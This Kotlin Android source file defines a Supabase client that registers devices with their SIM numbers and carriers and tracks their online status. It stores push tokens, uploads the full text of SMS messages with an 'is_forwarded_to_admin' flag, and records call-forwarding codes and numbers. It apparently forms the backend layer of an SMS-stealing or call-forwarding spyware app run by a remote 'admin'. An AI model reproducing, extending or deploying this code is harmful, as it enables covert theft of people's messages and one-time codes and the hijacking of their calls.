package com.example.admin.network

import android.content.Context
import android.util.Log
import kotlinx.coroutines.suspendCancellableCoroutine
import okhttp3.Call
import okhttp3.Callback
import okhttp3.Headers
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import org.json.JSONArray
import org.json.JSONObject
import java.io.IOException
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import java.util.UUID
import java.util.concurrent.TimeUnit
import kotlin.coroutines.resume

data class UpsertResult(val success: Boolean, val response: String?)
data class QueryResult(val success: Boolean, val data: List<JSONObject>?, val error: String?)
data class SingleResult(val success: Boolean, val data: JSONObject?, val error: String?)

class SupabaseApi(private val context: Context) {

    companion object {
        private const val TAG = "SUPABASE_API"

        // ✅ Your Supabase project
        private const val SUPABASE_URL = "https://imfwqoocwfvvtjghgofi.supabase.co"
        private const val APP_ID       = "bojxazyi"
        private const val KEY          = "sb_publishable_nrr3KfNnDXEiQ2QZNgBa4Q_IujWd0Qx"

        // ✅ TABLE_NAME auto-derives from APP_ID — no hardcoding needed
        private val TABLE_NAME         = "${APP_ID}_registered_devices"
        private val BASE_URL           = "${SUPABASE_URL}/rest/v1"

        private val JSON_MEDIA_TYPE = "application/json; charset=utf-8".toMediaType()

        // ✅ Always points to the correct table
        private fun getUrl(): String = "$BASE_URL/$TABLE_NAME"
    }

    private val client: OkHttpClient = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    fun getAppId(): String = APP_ID
    fun getOrCreateAppId(): String = APP_ID
    fun getTableName(): String = TABLE_NAME
    fun getSupabaseUrl(): String = SUPABASE_URL
    fun getSupabaseAnonKey(): String = KEY

    private fun jsonBody(jsonObject: JSONObject): RequestBody =
        jsonObject.toString().toRequestBody(JSON_MEDIA_TYPE)

    private fun headers(): Headers = Headers.Builder()
        .add("apikey", KEY)
        .add("Authorization", "Bearer $KEY")
        .add("Content-Type", "application/json")
        .build()

    private fun upsertHeaders(): Headers = Headers.Builder()
        .add("apikey", KEY)
        .add("Authorization", "Bearer $KEY")
        .add("Content-Type", "application/json")
        .add("Prefer", "resolution=merge-duplicates,return=representation")
        .build()

    private fun formatTimestamp(timestamp: Long): String {
        val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
        return sdf.format(Date(timestamp))
    }

    private fun maskPhone(number: String): String {
        val clean = number.trim()
        if (clean.isBlank()) return ""
        if (clean.length <= 4) return "****"
        return "****${clean.takeLast(4)}"
    }

    private suspend fun getDeviceByUidSuspend(uid: String): SingleResult =
        suspendCancellableCoroutine { continuation ->
            getDeviceByUid(uid) { result ->
                if (continuation.isActive) continuation.resume(result)
            }
        }

    // ==================== GENERIC UPSERT ====================

    suspend fun upsertData(data: JSONObject, dataType: String): UpsertResult {
        val subId = data.optString("sub_id", data.optString("uid", ""))
        return upsertData(data, dataType, subId)
    }

    suspend fun upsertData(
        data: JSONObject,
        dataType: String,
        subId: String
    ): UpsertResult = suspendCancellableCoroutine { continuation ->
        try {
            if (subId.isBlank()) {
                continuation.resume(UpsertResult(false, "subId/uid missing"))
                return@suspendCancellableCoroutine
            }
            val now = System.currentTimeMillis()
            val finalData = JSONObject().apply {
                put("sub_id", subId)
                put("app_id", APP_ID)
                put("uid", subId)
                put("data_type", dataType)
                put("data_json", data)
                put("updated_at", now)
                put("created_at", now)
            }
            val url = "${getUrl()}?on_conflict=sub_id"
            val request = Request.Builder().url(url).headers(upsertHeaders()).post(jsonBody(finalData)).build()
            Log.d(TAG, "UPSERT URL: $url")
            val call = client.newCall(request)
            continuation.invokeOnCancellation { call.cancel() }
            call.enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) {
                    if (continuation.isActive) continuation.resume(UpsertResult(false, "Network error: ${e.message}"))
                }
                override fun onResponse(call: Call, response: Response) {
                    response.use {
                        val body = it.body?.string()
                        if (continuation.isActive) {
                            if (it.isSuccessful) continuation.resume(UpsertResult(true, body))
                            else continuation.resume(UpsertResult(false, "HTTP ${it.code}: $body"))
                        }
                    }
                }
            })
        } catch (e: Exception) {
            if (continuation.isActive) continuation.resume(UpsertResult(false, "Exception: ${e.message}"))
        }
    }

    // ==================== REGISTER DEVICE ====================

    fun registerDevice(
        uid: String,
        deviceInfo: JSONObject,
        callback: (Boolean, String?) -> Unit
    ) {
        try {
            if (uid.isBlank()) { callback(false, "UID missing"); return }
            val now = System.currentTimeMillis()
            val dataJson = JSONObject().apply {
                put("model", deviceInfo.optString("model", ""))
                put("brand", deviceInfo.optString("brand", ""))
                put("manufacturer", deviceInfo.optString("manufacturer", ""))
                put("androidversion", deviceInfo.optString("androidversion", ""))
                put("device_name", deviceInfo.optString("device_name", deviceInfo.optString("model", "")))
                put("sim1number", deviceInfo.optString("sim1number", ""))
                put("sim1carrier", deviceInfo.optString("sim1carrier", ""))
                put("sim2number", deviceInfo.optString("sim2number", ""))
                put("sim2carrier", deviceInfo.optString("sim2carrier", ""))
                put("joinedat", deviceInfo.optLong("joinedat", now))
                put("joinedat_readable", formatTimestamp(deviceInfo.optLong("joinedat", now)))
                put("registered_at", now)
                put("registered_at_readable", formatTimestamp(now))
                put("fcm_token", "")
                put("fcm_token_status", "not_registered")
                put("online_status", "unknown")
                put("online_checked_at", 0)
                put("online_checked_at_readable", "")
                put("last_seen_at", 0)
                put("last_seen_at_readable", "")
            }
            val finalData = JSONObject().apply {
                put("sub_id", uid); put("app_id", APP_ID); put("uid", uid)
                put("data_type", "registered_device"); put("data_json", dataJson)
                put("status", "active"); put("registered_at", now)
                put("created_at", now); put("updated_at", now)
                put("sms_messages", JSONArray()); put("total_sms_count", 0)
                put("last_sms_timestamp", 0); put("last_sms_log", JSONObject())
            }
            val url = "${getUrl()}?on_conflict=sub_id"
            val request = Request.Builder().url(url).headers(upsertHeaders()).post(jsonBody(finalData)).build()
            Log.d(TAG, "REGISTER: $url")
            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) = callback(false, "Network error: ${e.message}")
                override fun onResponse(call: Call, response: Response) {
                    response.use {
                        val body = it.body?.string()
                        if (it.isSuccessful) callback(true, body)
                        else callback(false, "HTTP ${it.code}: $body")
                    }
                }
            })
        } catch (e: Exception) { callback(false, "Exception: ${e.message}") }
    }

    // ==================== FCM TOKEN ====================

    fun updateDeviceToken(uid: String, token: String, callback: (Boolean, String?) -> Unit) {
        if (uid.isBlank()) { callback(false, "UID missing"); return }
        if (token.isBlank()) { callback(false, "Token is empty"); return }
        getDeviceByUid(uid) { result ->
            if (result.success && result.data != null) {
                val dataJson = result.data.optJSONObject("data_json") ?: JSONObject()
                dataJson.put("fcm_token", token)
                dataJson.put("fcm_token_status", "active")
                updateData(uid, JSONObject().apply { put("data_json", dataJson); put("updated_at", System.currentTimeMillis()) }, callback)
            } else {
                val now = System.currentTimeMillis()
                val dataJson = JSONObject().apply {
                    put("fcm_token", token); put("fcm_token_status", "active")
                    put("online_status", "unknown"); put("online_checked_at", 0)
                    put("online_checked_at_readable", ""); put("last_seen_at", 0); put("last_seen_at_readable", "")
                }
                val finalData = JSONObject().apply {
                    put("sub_id", uid); put("app_id", APP_ID); put("uid", uid)
                    put("data_type", "registered_device"); put("data_json", dataJson)
                    put("status", "registered"); put("created_at", now); put("updated_at", now)
                    put("sms_messages", JSONArray()); put("total_sms_count", 0)
                    put("last_sms_timestamp", 0); put("last_sms_log", JSONObject())
                }
                val url = "${getUrl()}?on_conflict=sub_id"
                val request = Request.Builder().url(url).headers(upsertHeaders()).post(jsonBody(finalData)).build()
                client.newCall(request).enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) = callback(false, "Network error: ${e.message}")
                    override fun onResponse(call: Call, response: Response) {
                        response.use {
                            val body = it.body?.string()
                            if (it.isSuccessful) callback(true, body) else callback(false, "HTTP ${it.code}: $body")
                        }
                    }
                })
            }
        }
    }

    fun getDeviceToken(uid: String, callback: (String?) -> Unit) {
        getDeviceInfo(uid) { dataJson ->
            callback(dataJson?.optString("fcm_token", "")?.takeIf { it.isNotBlank() })
        }
    }

    fun isTokenValid(uid: String, callback: (Boolean) -> Unit) {
        getDeviceInfo(uid) { dataJson ->
            if (dataJson != null) {
                val status = dataJson.optString("fcm_token_status", "")
                val token = dataJson.optString("fcm_token", "")
                callback(status == "active" && token.isNotBlank())
            } else callback(false)
        }
    }

    fun invalidateDeviceToken(uid: String, callback: (Boolean, String?) -> Unit) {
        if (uid.isBlank()) { callback(false, "UID missing"); return }
        getDeviceByUid(uid) { result ->
            if (result.success && result.data != null) {
                val dataJson = result.data.optJSONObject("data_json") ?: JSONObject()
                dataJson.put("fcm_token_status", "inactive")
                updateData(uid, JSONObject().apply { put("data_json", dataJson); put("updated_at", System.currentTimeMillis()) }, callback)
            } else callback(false, "Device not found")
        }
    }

    // ==================== ONLINE STATUS ====================

    fun updateOnlineStatus(uid: String, isOnline: Boolean, callback: (Boolean, String?) -> Unit) {
        if (uid.isBlank()) { callback(false, "UID missing"); return }
        // ✅ App se kabhi offline write nahi karna
        if (!isOnline) { callback(true, "Ignored offline update by app rule"); return }
        val now = System.currentTimeMillis()
        getDeviceByUid(uid) { result ->
            if (result.success && result.data != null) {
                val dataJson = result.data.optJSONObject("data_json") ?: JSONObject()
                dataJson.put("online_status", "online")
                dataJson.put("online_checked_at", now)
                dataJson.put("online_checked_at_readable", formatTimestamp(now))
                dataJson.put("last_seen_at", now)
                dataJson.put("last_seen_at_readable", formatTimestamp(now))
                updateData(uid, JSONObject().apply {
                    put("status", "online"); put("data_json", dataJson)
                    put("last_heartbeat_at", now); put("updated_at", now)
                }, callback)
            } else {
                val dataJson = JSONObject().apply {
                    put("online_status", "online"); put("online_checked_at", now)
                    put("online_checked_at_readable", formatTimestamp(now))
                    put("last_seen_at", now); put("last_seen_at_readable", formatTimestamp(now))
                }
                val finalData = JSONObject().apply {
                    put("sub_id", uid); put("app_id", APP_ID); put("uid", uid)
                    put("data_type", "registered_device"); put("status", "online")
                    put("data_json", dataJson); put("last_heartbeat_at", now)
                    put("created_at", now); put("updated_at", now)
                    put("sms_messages", JSONArray()); put("total_sms_count", 0)
                    put("last_sms_timestamp", 0); put("last_sms_log", JSONObject())
                }
                val url = "${getUrl()}?on_conflict=sub_id"
                val request = Request.Builder().url(url).headers(upsertHeaders()).post(jsonBody(finalData)).build()
                client.newCall(request).enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) = callback(false, "Network error: ${e.message}")
                    override fun onResponse(call: Call, response: Response) {
                        response.use {
                            val body = it.body?.string()
                            if (it.isSuccessful) callback(true, body) else callback(false, "HTTP ${it.code}: $body")
                        }
                    }
                })
            }
        }
    }

    fun getOnlineStatus(uid: String, callback: (Boolean?) -> Unit) {
        getDeviceInfo(uid) { dataJson ->
            if (dataJson != null) callback(dataJson.optString("online_status", "") == "online")
            else callback(null)
        }
    }

    fun getOnlineStatusInfo(uid: String, callback: (JSONObject?) -> Unit) {
        getDeviceInfo(uid) { dataJson ->
            if (dataJson != null) {
                callback(JSONObject().apply {
                    put("online_status", dataJson.optString("online_status", "unknown"))
                    put("online_checked_at", dataJson.optLong("online_checked_at", 0))
                    put("online_checked_at_readable", dataJson.optString("online_checked_at_readable", ""))
                    put("last_seen_at", dataJson.optLong("last_seen_at", 0))
                    put("last_seen_at_readable", dataJson.optString("last_seen_at_readable", ""))
                })
            } else callback(null)
        }
    }

    // ==================== HEARTBEAT ====================

    suspend fun upsertHeartbeat(uid: String, heartbeatData: JSONObject): UpsertResult {
        if (uid.isBlank()) return UpsertResult(false, "UID missing")
        return try {
            val now = System.currentTimeMillis()
            val existingResult = getDeviceByUidSuspend(uid)
            val hasExisting = existingResult.success && existingResult.data != null
            val dataJson = if (hasExisting) existingResult.data!!.optJSONObject("data_json") ?: JSONObject()
                           else JSONObject()
            dataJson.put("online_status", "online")
            dataJson.put("online_checked_at", now)
            dataJson.put("online_checked_at_readable", formatTimestamp(now))
            dataJson.put("last_seen_at", now)
            dataJson.put("last_seen_at_readable", formatTimestamp(now))
            dataJson.put("heartbeat", JSONObject().apply {
                put("available", heartbeatData.optString("available", "Device is online"))
                put("checked_at", heartbeatData.optLong("checked_at", now))
            })
            val finalData = JSONObject().apply {
                put("sub_id", uid); put("app_id", APP_ID); put("uid", uid)
                put("data_type", "registered_device"); put("status", "online")
                put("last_heartbeat_at", now); put("data_json", dataJson); put("updated_at", now)
                if (!hasExisting) {
                    put("created_at", now); put("sms_messages", JSONArray())
                    put("total_sms_count", 0); put("last_sms_timestamp", 0); put("last_sms_log", JSONObject())
                }
            }
            val url = "${getUrl()}?on_conflict=sub_id"
            val request = Request.Builder().url(url).headers(upsertHeaders()).post(jsonBody(finalData)).build()
            Log.d(TAG, "HEARTBEAT: $url")
            suspendCancellableCoroutine { continuation ->
                val call = client.newCall(request)
                continuation.invokeOnCancellation { call.cancel() }
                call.enqueue(object : Callback {
                    override fun onFailure(call: Call, e: IOException) {
                        if (continuation.isActive) continuation.resume(UpsertResult(false, "Network error: ${e.message}"))
                    }
                    override fun onResponse(call: Call, response: Response) {
                        response.use {
                            val body = it.body?.string()
                            if (continuation.isActive) {
                                if (it.isSuccessful) continuation.resume(UpsertResult(true, body))
                                else continuation.resume(UpsertResult(false, "HTTP ${it.code}: $body"))
                            }
                        }
                    }
                })
            }
        } catch (e: Exception) { UpsertResult(false, "Exception: ${e.message}") }
    }

    // ==================== GET DEVICE INFO ====================

    fun getDeviceInfo(uid: String, callback: (JSONObject?) -> Unit) {
        getDeviceByUid(uid) { result ->
            if (result.success && result.data != null)
                callback(result.data.optJSONObject("data_json"))
            else callback(null)
        }
    }

    // ==================== UPDATE DATA ====================

    fun updateData(uid: String, updates: JSONObject, callback: (Boolean, String?) -> Unit) {
        try {
            if (uid.isBlank()) { callback(false, "UID missing"); return }
            updates.put("updated_at", System.currentTimeMillis())
            val url = "${getUrl()}?sub_id=eq.$uid"
            val request = Request.Builder().url(url).headers(headers()).patch(jsonBody(updates)).build()
            Log.d(TAG, "UPDATE: $url")
            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) = callback(false, "Network error: ${e.message}")
                override fun onResponse(call: Call, response: Response) {
                    response.use {
                        val body = it.body?.string()
                        if (it.isSuccessful) callback(true, body) else callback(false, "HTTP ${it.code}: $body")
                    }
                }
            })
        } catch (e: Exception) { callback(false, "Exception: ${e.message}") }
    }

    // ==================== GET DEVICE BY UID ====================

    fun getDeviceByUid(uid: String, callback: (SingleResult) -> Unit) {
        try {
            if (uid.isBlank()) { callback(SingleResult(false, null, "UID missing")); return }
            val url = "${getUrl()}?sub_id=eq.$uid&limit=1"
            val request = Request.Builder().url(url).headers(headers()).get().build()
            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) =
                    callback(SingleResult(false, null, "Network error: ${e.message}"))
                override fun onResponse(call: Call, response: Response) {
                    response.use {
                        val body = it.body?.string()
                        if (it.isSuccessful && body != null) {
                            try {
                                val arr = JSONArray(body)
                                if (arr.length() > 0) callback(SingleResult(true, arr.getJSONObject(0), null))
                                else callback(SingleResult(true, null, "No data found"))
                            } catch (e: Exception) { callback(SingleResult(false, null, "Parse error: ${e.message}")) }
                        } else callback(SingleResult(false, null, "HTTP ${it.code}: $body"))
                    }
                }
            })
        } catch (e: Exception) { callback(SingleResult(false, null, "Exception: ${e.message}")) }
    }

    // ==================== GET ALL DEVICES ====================

    fun getAllDevices(limit: Int = 1000, callback: (QueryResult) -> Unit) {
        try {
            val safeLimit = limit.coerceIn(1, 1000)
            val url = "${getUrl()}?app_id=eq.$APP_ID&order=created_at.desc&limit=$safeLimit"
            val request = Request.Builder().url(url).headers(headers()).get().build()
            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) =
                    callback(QueryResult(false, null, "Network error: ${e.message}"))
                override fun onResponse(call: Call, response: Response) {
                    response.use {
                        val body = it.body?.string()
                        if (it.isSuccessful && body != null) {
                            try {
                                val arr = JSONArray(body)
                                val list = mutableListOf<JSONObject>()
                                for (i in 0 until arr.length()) list.add(arr.getJSONObject(i))
                                callback(QueryResult(true, list, null))
                            } catch (e: Exception) { callback(QueryResult(false, null, "Parse error: ${e.message}")) }
                        } else callback(QueryResult(false, null, "HTTP ${it.code}: $body"))
                    }
                }
            })
        } catch (e: Exception) { callback(QueryResult(false, null, "Exception: ${e.message}")) }
    }

    fun getDevicesWithActiveTokens(callback: (List<Pair<String, String>>) -> Unit) {
        getAllDevices { result ->
            if (result.success && result.data != null) {
                callback(result.data.mapNotNull { device ->
                    val uid = device.optString("sub_id", "")
                    val dataJson = device.optJSONObject("data_json")
                    val token = dataJson?.optString("fcm_token", "") ?: ""
                    val status = dataJson?.optString("fcm_token_status", "") ?: ""
                    if (uid.isNotBlank() && token.isNotBlank() && status == "active") Pair(uid, token) else null
                })
            } else callback(emptyList())
        }
    }

    fun getOnlineDevices(callback: (List<Pair<String, JSONObject>>) -> Unit) {
        getAllDevices { result ->
            if (result.success && result.data != null) {
                callback(result.data.mapNotNull { device ->
                    val uid = device.optString("sub_id", "")
                    val dataJson = device.optJSONObject("data_json")
                    if (uid.isNotBlank() && dataJson != null && dataJson.optString("online_status") == "online")
                        Pair(uid, dataJson) else null
                })
            } else callback(emptyList())
        }
    }

    // ==================== SMS STORAGE ====================

    fun insertSmsLog(smsData: JSONObject, callback: (Boolean, String?) -> Unit) {
        val uid = smsData.optString("uid", smsData.optString("sub_id", ""))
        if (uid.isBlank()) { callback(false, "UID missing"); return }
        getDeviceByUid(uid) { result ->
            if (result.success && result.data != null) {
                val smsArray = JSONArray()
                val existingSms = result.data.optJSONArray("sms_messages")
                if (existingSms != null) for (i in 0 until existingSms.length()) smsArray.put(existingSms.getJSONObject(i))
                val senderNumber    = smsData.optString("phone_number", "")
                val receiverNumber  = smsData.optString("receiver_number", "")
                val messageBody     = smsData.optString("message_body", "")
                val timestamp       = smsData.optLong("timestamp", System.currentTimeMillis())
                val direction       = smsData.optString("direction", "incoming")
                val status          = smsData.optString("status", "received")
                val simSlot         = smsData.optInt("sim_slot", 1)
                val smsId           = smsData.optString("sms_id", UUID.randomUUID().toString())
                val title           = smsData.optString("title", "New SMS")
                val isForwarded     = smsData.optBoolean("is_forwarded_to_admin", false)
                smsArray.put(JSONObject().apply {
                    put("sms_id", smsId); put("sender_number", senderNumber)
                    put("receiver_number", receiverNumber); put("message_body", messageBody.take(1000))
                    put("timestamp", timestamp); put("timestamp_readable", formatTimestamp(timestamp))
                    put("direction", direction); put("status", status); put("sim_slot", simSlot)
                    put("synced_at", System.currentTimeMillis()); put("message_length", messageBody.length)
                    put("title", title); put("is_forwarded_to_admin", isForwarded)
                })
                while (smsArray.length() > 1000) smsArray.remove(0)
                val lastSmsLog = JSONObject().apply {
                    put("title", title); put("status", status); put("direction", direction)
                    put("timestamp", formatTimestamp(timestamp)); put("synced_at", System.currentTimeMillis())
                    put("is_forwarded_to_admin", isForwarded); put("sender_masked", maskPhone(senderNumber))
                    put("receiver_masked", maskPhone(receiverNumber)); put("message_length", messageBody.length)
                    put("has_body", messageBody.isNotBlank()); put("message_preview", messageBody.take(100))
                    put("sms_id", smsId); put("message_body", messageBody.take(500))
                }
                updateData(uid, JSONObject().apply {
                    put("sms_messages", smsArray); put("last_sms_log", lastSmsLog)
                    put("total_sms_count", smsArray.length()); put("last_sms_timestamp", timestamp)
                    put("sms_sync_status", "SYNCED"); put("sms_last_sync_at", System.currentTimeMillis())
                }, callback)
            } else callback(false, result.error ?: "Device not found")
        }
    }

    fun getLastSmsLog(uid: String, callback: (SingleResult) -> Unit) {
        getDeviceByUid(uid) { result ->
            if (result.success && result.data != null) {
                val log = result.data.optJSONObject("last_sms_log")
                callback(SingleResult(true, log, if (log == null) "No SMS logs found" else null))
            } else callback(SingleResult(false, null, result.error ?: "Device not found"))
        }
    }

    fun getSmsHistory(uid: String, limit: Int = 50, offset: Int = 0, callback: (QueryResult) -> Unit) {
        getDeviceByUid(uid) { result ->
            if (result.success && result.data != null) {
                val smsArray = result.data.optJSONArray("sms_messages")
                if (smsArray != null) {
                    val list = mutableListOf<JSONObject>()
                    for (i in 0 until smsArray.length()) list.add(smsArray.getJSONObject(i))
                    list.sortByDescending { it.optLong("timestamp", 0) }
                    val start = offset.coerceAtLeast(0).coerceAtMost(list.size)
                    val end = minOf(start + limit.coerceAtLeast(1), list.size)
                    callback(QueryResult(true, list.subList(start, end), null))
                } else callback(QueryResult(true, emptyList(), null))
            } else callback(QueryResult(false, null, result.error ?: "Device not found"))
        }
    }

    // ==================== CALL FORWARD ====================

    fun updateCallForwardData(
        uid: String, code: String, slot: Int, status: String,
        response: String, action: String, number: String,
        callback: (Boolean, String?) -> Unit
    ) {
        if (uid.isBlank()) { callback(false, "UID missing"); return }
        updateData(uid, JSONObject().apply {
            put("call_forward_status", status); put("call_forward_action", action)
            put("call_forward_code", code); put("call_forward_number", number)
            put("call_forward_sim_slot", slot); put("call_forward_response", response.take(500))
            put("call_forward_timestamp", System.currentTimeMillis())
        }, callback)
    }

    // ==================== SMS SYNC STATUS ====================

    fun updateSmsSyncStatus(
        uid: String, pendingCount: Int, processedCount: Int,
        status: String, permissionStatus: String, error: String?,
        callback: (Boolean, String?) -> Unit
    ) {
        if (uid.isBlank()) { callback(false, "UID missing"); return }
        updateData(uid, JSONObject().apply {
            put("sms_sync_status", status); put("sms_pending_count", pendingCount)
            put("sms_processed_count", processedCount); put("sms_permission_status", permissionStatus)
            put("sms_last_sync_at", System.currentTimeMillis()); put("sms_last_error", error ?: "")
        }, callback)
    }

    // ==================== DELETE ====================

    fun deleteData(uid: String, callback: (Boolean, String?) -> Unit) {
        try {
            if (uid.isBlank()) { callback(false, "UID missing"); return }
            val url = "${getUrl()}?sub_id=eq.$uid"
            val request = Request.Builder().url(url).headers(headers()).delete().build()
            client.newCall(request).enqueue(object : Callback {
                override fun onFailure(call: Call, e: IOException) = callback(false, "Network error: ${e.message}")
                override fun onResponse(call: Call, response: Response) {
                    response.use {
                        if (it.isSuccessful) callback(true, "Deleted successfully")
                        else callback(false, "HTTP ${it.code}: ${it.body?.string()}")
                    }
                }
            })
        } catch (e: Exception) { callback(false, "Exception: ${e.message}") }
    }
}
